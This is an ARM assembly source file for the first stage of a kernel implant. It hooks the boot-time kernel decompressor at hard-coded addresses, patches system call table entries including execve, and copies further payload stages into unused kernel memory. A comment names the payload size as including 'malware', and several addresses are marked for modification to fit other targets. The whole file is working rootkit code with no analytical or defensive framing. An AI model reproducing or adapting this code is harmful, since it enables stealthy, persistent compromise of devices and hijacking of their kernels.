step1:
b Locate1
.word 0x00001110
.word 0x00001111
.word 0x00001112
.word 0x00001113
.word 0x00001114
.word 0x00001115
.word 0x00001116
.word 0x00001117
.word 0x00001118
.word 0x00001119
.word 0x0000111a
.word 0x0000111b
.word 0x0000111c
.word 0x0000111d
.word 0x0000111e
.word 0x0000111f
.word 0x00001120
Locate1:
	str r0, [pc, #-76]
	str r1, [pc, #-76]
	str r2, [pc, #-76]
	str r3, [pc, #-76]
	str r4, [pc, #-76]
	str r5, [pc, #-76]
	str r6, [pc, #-76]
	str r7, [pc, #-76]
	str r8, [pc, #-76]
	str r9, [pc, #-76]
	str r10, [pc, #-76]
	str r11, [pc, #-76]
	str r12, [pc, #-76]
	str r13, [pc, #-76]
	str r14, [pc, #-76]
	mrs r0, cpsr
	str r0, [pc, #-80]
	mrs r0, spsr
	str r0, [pc, #-84]

PPoint0:
	sub r4, pc, #PPoint0
	sub r4, r4, #8
	add r4, r4, #Uncompress_Parameter
	ldr r0, [r4, #4]
	ldr r1, [r4]
	@ write 0x30008128 -> ldr pc, [pc #-4]
	str r0, [r1]

PPoint1:
    sub r0, pc, #PPoint1
    sub r0, r0, #8
    add r0, r0, #step12
	add r1, r1, #4
	@ write 0x3000812c -> &step12
	str r0, [r1]

LLocate:
	sub r14, pc, #LLocate
	sub r14, r14, #8
	add r14, r14, #Locate1
	ldr r0, [r14, #-8]
	msr cpsr, r0
	ldr r0, [r14, #-4]
	msr spsr, r0
	ldr r0, [r14, #-68]
	ldr r1, [r14, #-64]
	ldr r2, [r14, #-60]
	ldr r3, [r14, #-56]
	ldr r4, [r14, #-52]
	ldr r5, [r14, #-48]
	ldr r6, [r14, #-44]
	ldr r7, [r14, #-40]
	ldr r8, [r14, #-36]
	ldr r9, [r14, #-32]
	ldr r10, [r14, #-28]
	ldr r11, [r14, #-24]
	ldr r12, [r14, #-20]
	ldr r13, [r14, #-16]
	ldr r14, [r14, #-12]

    mov pc, r5 @0xd04

Uncompress_Parameter:
.word 0x30008128             @modify
    ldr pc, [pc, #-4]

step12:
b Locate2

.word 0x00001110
.word 0x00001111
.word 0x00001112
.word 0x00001113
.word 0x00001114
.word 0x00001115
.word 0x00001116
.word 0x00001117
.word 0x00001118
.word 0x00001119
.word 0x0000111a
.word 0x0000111b
.word 0x0000111c
.word 0x0000111d
.word 0x0000111e
.word 0x0000111f
.word 0x00001120
Locate2:
	str r0, [pc, #-76]
	str r1, [pc, #-76]
	str r2, [pc, #-76]
	str r3, [pc, #-76]
	str r4, [pc, #-76]
	str r5, [pc, #-76]
	str r6, [pc, #-76]
	str r7, [pc, #-76]
	str r8, [pc, #-76]
	str r9, [pc, #-76]
	str r10, [pc, #-76]
	str r11, [pc, #-76]
	str r12, [pc, #-76]
	str r13, [pc, #-76]
	str r14, [pc, #-76]
	mrs r0, cpsr
	str r0, [pc, #-80]
	mrs r0, spsr
	str r0, [pc, #-84]

Syscall_PPoint1:
	sub r4, pc, #Syscall_PPoint1
	sub r4, r4, #8
	add r4, r4, #Parameter_syscall
	ldr r0, [r4, #8]
	ldr r1, [r4]
	ldr r2, [r4, #0xc]
	add r1, r1, #44
	str r0, [r1]
	ldr r1, [r4, #4]
	add r1, r1, r2
	str r0, [r1]
	bl PPoint2

Parameter_syscall:
    .word 0x30272b04 @ syscall: 0xc0030088-0xC0008000+0x3024aa7c   @modify
    .word 0x30273180 @ syscall: 0xc0030704-0xC0008000+0x3024aa7c   @modify
    .word 0xc0429910 @ empty space: 0xc0429910-0xC0008000+0x3024aa7c  @modify
    .word 0x2c  @ execve 11


PPoint2:
	sub r7, pc, #PPoint2
	sub r7, r7, #8
	add r7, r7, #KernelStrPara

	ldr r4, [r7]
	mov r5, #0

PPoint3:
	sub r6, pc, #PPoint3
	sub r6, r6, #8
	add r6, r6, #step2
Loop0:
	ldr r0, [r7, #4] @dest addr
	ldr r1, [r7, #8] @offset
	add r1, r1, r6
	ldr r3, [r7, #12] @size
	add r3, r3, r1

	Loop1:
		ldmia r1!, {r2}
		stmia r0!, {r2}
		cmp  r1, r3
		bcc Loop1

	add r7, r7, #12
	add r5, r5, #1
	cmp r5, r4
	bne Loop0

	LLLocate:
	sub r14, pc, #LLLocate
	sub r14, r14, #8
	add r14, r14, #Locate2
	ldr r0, [r14, #-8]
	msr cpsr, r0
	ldr r0, [r14, #-4]
	msr spsr, r0
	ldr r0, [r14, #-68]
	ldr r1, [r14, #-64]
	ldr r2, [r14, #-60]
	ldr r3, [r14, #-56]
	ldr r4, [r14, #-52]
	ldr r5, [r14, #-48]
	ldr r6, [r14, #-44]
	ldr r7, [r14, #-40]
	ldr r8, [r14, #-36]
	ldr r9, [r14, #-32]
	ldr r10, [r14, #-28]
	ldr r11, [r14, #-24]
	ldr r12, [r14, #-20]
	ldr r13, [r14, #-16]
	ldr r14, [r14, #-12]

	ADD PC, R5, R0 @compressed kernel. 0x128

KernelStrPara:
.word 0x2    @total space=len(step2.bin)+len(step3.bin)+len(malware)   @modify

.word 0x3066c38c @ empty space: 0xc0429910-0xC0008000+0x3024aa7c
.word 0x0
.word 0x6f0

.word 0x30684dac @ empty space: 0xc0442330-0xC0008000+0x3024aa7c
.word 0x6f0
.word 0x19b0

.word 0x30270f20 @ empty space: 0xC002E4A4-0xC0008000+0x3024aa7c
.word 0
.word 0

step2:
